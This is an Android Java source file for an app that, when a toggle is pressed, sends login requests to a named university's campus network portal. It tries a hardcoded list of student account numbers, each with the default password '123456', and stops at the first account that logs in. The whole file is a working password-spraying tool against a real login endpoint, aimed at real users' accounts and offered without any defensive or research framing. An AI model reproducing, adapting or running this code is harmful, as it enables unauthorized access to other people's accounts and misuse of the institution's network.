package pw.usual.PortalBoasting;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.ToggleButton;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    private ToggleButton loginButton;
    private TextView logArea;
    private ScrollView scrollBar;

    private Thread attemptThread = null;
    private boolean interrupted = false;
    private View.OnClickListener onStartButtonClick = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            Log.i("LoginButton", "Click.");

            if (loginButton.isChecked()){
                logArea.setText("");
                startAttemptThread();
            }
            else{
                stopAttemptThread();
            }
        }
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        loginButton = (ToggleButton) findViewById(R.id.LoginButton);
        logArea = (TextView) findViewById(R.id.LogArea);
        scrollBar = (ScrollView) findViewById(R.id.ScrollBar);

        loginButton.setOnClickListener(onStartButtonClick);
    }

    @Override
    public void onDestroy(){
        stopAttemptThread();
        super.onDestroy();
    }

    private void startAttemptThread(){
        interrupted = false;

        attemptThread = new AttemptThread();
        attemptThread.start();
    }

    private void stopAttemptThread(){
        interrupted = true;
        try {
            attemptThread.join();
            attemptThread.interrupt();
            attemptThread = null;
        }
        catch (InterruptedException e){

        }
    }

    private class AttemptThread extends Thread{
        private HttpPost httpPost;
        private HttpClient httpClient;
        private HttpResponse httpResponse;
        private String stringResponse;

        private List<NameValuePair> params;
        private BasicNameValuePair valueSaved;
        private BasicNameValuePair valueDomain;
        private BasicNameValuePair valueFrom;
        private BasicNameValuePair valuePassword;

        private int []users = {70206044,70205971,70205746,70205743,70205695,70205696,70205456,70205433,70205432,70205410,70205342,70205340,70205331,70205332,70205277,70205155,70205057,70205036,70205034,70204963,70204959,70204952,70204946,70204937,70204880,70204858,70204795,70204723,70204691,70204664,70204665,70204632,70204616,70204596,70204545,70204320,70204314,70204215,70204075,70203975,70203945,70203944,70203912,70203734,70203521,70203443,70203299,70203110,70202991,70202878,70202636,70202578,70202579,70202279,70202031,70201850,70201829,70201776,70201739,70201516,70201463,70201316,70200748,70200340};

        public AttemptThread(){
            httpPost = new HttpPost("http://w.nuaa.edu.cn/iPortal/action/doLogin.do");
            httpClient = new DefaultHttpClient();

            httpClient.getParams().setParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 3000);
            httpClient.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 3000);

            params = new ArrayList<>();
            valueSaved = new BasicNameValuePair("saved", "0");
            valueDomain = new BasicNameValuePair("domain", "1");
            valueFrom = new BasicNameValuePair("from", "003cc944be32e25365428f2dd2adbbe2");
            valuePassword = new BasicNameValuePair("password", "123456");
        }

        @Override
        public void run(){
            for (int user : users) {
                params.clear();
                params.add(valueSaved);
                params.add(valueDomain);
                params.add(valueFrom);
                params.add(valuePassword);
                params.add(new BasicNameValuePair("username", String.valueOf(user)));

                try {
                    httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
                    httpResponse = httpClient.execute(httpPost);

                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
                        stringResponse = EntityUtils.toString(httpResponse.getEntity());
                        JSONObject json = new JSONObject(stringResponse);
                        JSONObject data = new JSONObject((String)json.get("data"));
                        String status = (String) data.get("status");

                        log(user, status);

                        if (status.equals("connected")){
                            endWithLog("已连接.");
                            return;
                        }
                        else if (status.equals("success")){
                            endWithLog("登录成功.");
                            return;
                        }
                    }
                    else {
                        int statusCode = httpResponse.getStatusLine().getStatusCode();
                        log(user, String.valueOf(statusCode));
                        Log.e("Error", "Http response is " + String.valueOf(statusCode));
                    }
                }
                catch (SocketTimeoutException e){
                    log(user, " timeout");
                    Log.e("SocketTimeOut", String.valueOf(user));
                }
                catch (JSONException e){
                    Log.e("JsonException", stringResponse);
                }
                catch (Exception e) {
                    Log.e("Error", e.getClass().toString());
                }

                if (interrupted){
                    endWithLog("手动终止.");
                    return;
                }
            }

            endWithLog("登录失败.");
        }

        private void log(int user, String status){
            logArea.post(new Runnable() {
                @Override
                public void run() {
                    logArea.append(String.valueOf(user) + " " + status + "\n");
                    scrollBar.fullScroll(View.FOCUS_DOWN);
                }
            });
        }

        private void endWithLog(String message){
            loginButton.post(new Runnable() {
                @Override
                public void run() {
                    logArea.append(message);
                    loginButton.setChecked(false);
                }
            });
        }
    }
}
